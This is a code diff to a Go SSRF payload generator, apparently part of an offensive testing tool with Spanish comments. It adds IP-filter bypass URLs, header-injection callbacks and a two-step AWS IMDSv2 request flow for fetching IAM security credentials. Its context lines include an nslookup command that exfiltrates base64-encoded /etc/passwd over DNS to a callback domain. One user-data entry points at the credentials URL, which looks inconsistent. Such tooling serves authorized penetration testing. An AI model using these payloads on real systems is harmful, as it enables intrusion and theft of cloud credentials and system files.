@@ -66,12 +66,18 @@ func GeneratePayloads(ptype string, rawParams json.RawMessage) (*PayloadResult, 
 		result.Payloads = generateProtocolPayloads(id, domain)
 	case "exfil":
 		result.Payloads = generateExfilPayloads(id, domain)
+	case "headers", "header-injection":
+		result.Payloads = generateHeaderInjectionPayloads(id, domain)
+	case "imdsv2":
+		result.Payloads = generateIMDSv2Payloads(id, domain)
 	default:
 		// Return all types
 		result.Payloads = append(result.Payloads, generateOOBPayloads(id, domain)...)
 		result.Payloads = append(result.Payloads, generateIPBypassPayloads("127.0.0.1", id, domain)...)
 		result.Payloads = append(result.Payloads, generateCloudMetadataPayloads(id, domain)...)
 		result.Payloads = append(result.Payloads, generateProtocolPayloads(id, domain)...)
+		result.Payloads = append(result.Payloads, generateHeaderInjectionPayloads(id, domain)...)
+		result.Payloads = append(result.Payloads, generateIMDSv2Payloads(id, domain)...)
 	}
 
 	return result, nil
@@ -145,6 +151,34 @@ func generateIPBypassPayloads(targetIP, id, domain string) []PayloadEntry {
 		},
 	}
 
+	// Leading-zeros bypass
+	entries = append(entries,
+		PayloadEntry{
+			Payload:     fmt.Sprintf("http://0%d.0%d.0%d.0%d/", a, b, c, d),
+			Description: "Leading zeros en cada octeto — algunos parsers los ignoran " + note,
+			Technique:   "ip-leading-zeros",
+		},
+		PayloadEntry{
+			Payload:     fmt.Sprintf("http://%03d.%03d.%03d.%03d/", a, b, c, d),
+			Description: "Octetos con 3 dígitos — zero-padded " + note,
+			Technique:   "ip-leading-zeros-3",
+		},
+	)
+
+	// URL scheme case sensitivity bypass
+	entries = append(entries,
+		PayloadEntry{
+			Payload:     fmt.Sprintf("HTTP://%s/", targetIP),
+			Description: "Scheme uppercase — algunos filtros son case-sensitive",
+			Technique:   "scheme-uppercase",
+		},
+		PayloadEntry{
+			Payload:     fmt.Sprintf("hTTp://%s/", targetIP),
+			Description: "Scheme mixed-case — bypass de filtros con comparación exacta",
+			Technique:   "scheme-mixedcase",
+		},
+	)
+
 	// IPv6 variants (solo para 127.0.0.1)
 	if targetIP == "127.0.0.1" {
 		entries = append(entries,
@@ -162,6 +196,11 @@ func generateIPBypassPayloads(targetIP, id, domain string) []PayloadEntry {
 				Payload:     "http://[::ffff:127.0.0.1]/",
 				Description: "IPv4-mapped IPv6",
 				Technique:   "ip-ipv4mapped",
+			},
+			PayloadEntry{
+				Payload:     "http://[fe80::1%25eth0]/",
+				Description: "IPv6 Zone ID — algunos parsers ignoran o truncan el zone identifier",
+				Technique:   "ip-ipv6-zone",
 			},
 			PayloadEntry{
 				Payload:     "http://127.1/",
@@ -297,6 +336,71 @@ func generateExfilPayloads(id, domain string) []PayloadEntry {
 			Payload:     "nslookup $(cat /etc/passwd|base64|head -c 50)." + id + "." + domain,
 			Description: "nslookup + base64 para exfiltrar /etc/passwd en chunks DNS",
 			Technique:   "exfil-dns-chunk",
+		},
+	}
+}
+
+// generateHeaderInjectionPayloads returns OOB callbacks labelled by the injection header.
+func generateHeaderInjectionPayloads(id, domain string) []PayloadEntry {
+	target := fmt.Sprintf("http://%s.%s/header-ssrf", id, domain)
+	hostOnly := fmt.Sprintf("%s.%s", id, domain)
+	return []PayloadEntry{
+		{
+			Payload:     target,
+			Description: "Inyectar en X-Forwarded-For — proxies y backends suelen usarlo para routing",
+			Technique:   "header-xff",
+		},
+		{
+			Payload:     target,
+			Description: "Inyectar en X-Original-URL — sobrescribe la URL en algunos proxies (nginx, traefik)",
+			Technique:   "header-original-url",
+		},
+		{
+			Payload:     target,
+			Description: "Inyectar en X-Rewrite-URL — IIS y algunos reverse proxies reescriben con este header",
+			Technique:   "header-rewrite-url",
+		},
+		{
+			Payload:     target,
+			Description: "Inyectar en Referer — backends que hacen fetch de la URL del Referer (social previews, etc.)",
+			Technique:   "header-referer",
+		},
+		{
+			Payload:     hostOnly,
+			Description: "Inyectar en Host — cambia el routing del backend si no valida el Host header",
+			Technique:   "header-host",
+		},
+		{
+			Payload:     target,
+			Description: "Inyectar en X-Forwarded-Host — CDNs y balanceadores lo usan para reconstruir URLs",
+			Technique:   "header-fwd-host",
+		},
+	}
+}
+
+// generateIMDSv2Payloads returns the two-step AWS IMDSv2 flow with explicit instructions.
+func generateIMDSv2Payloads(id, domain string) []PayloadEntry {
+	oobConfirm := fmt.Sprintf("http://%s.%s/imdsv2-confirm", id, domain)
+	return []PayloadEntry{
+		{
+			Payload:     "http://169.254.169.254/latest/api/token",
+			Description: "IMDSv2 paso 1 — PUT con header 'X-aws-ec2-metadata-token-ttl-seconds: 21600' para obtener token",
+			Technique:   "cloud-aws-imdsv2-step1",
+		},
+		{
+			Payload:     "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
+			Description: "IMDSv2 paso 2 — GET con header 'X-aws-ec2-metadata-token: <token_del_paso_1>'",
+			Technique:   "cloud-aws-imdsv2-step2",
+		},
+		{
+			Payload:     "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
+			Description: "IMDSv2 paso 2 — user-data (puede contener scripts con credenciales hardcoded)",
+			Technique:   "cloud-aws-imdsv2-userdata",
+		},
+		{
+			Payload:     oobConfirm,
+			Description: "Confirmar acceso a IMDS vía nuestro servidor OOB (útil si el target hace fetch del token y luego callback)",
+			Technique:   "cloud-aws-imdsv2-oob",
 		},
 	}
 }
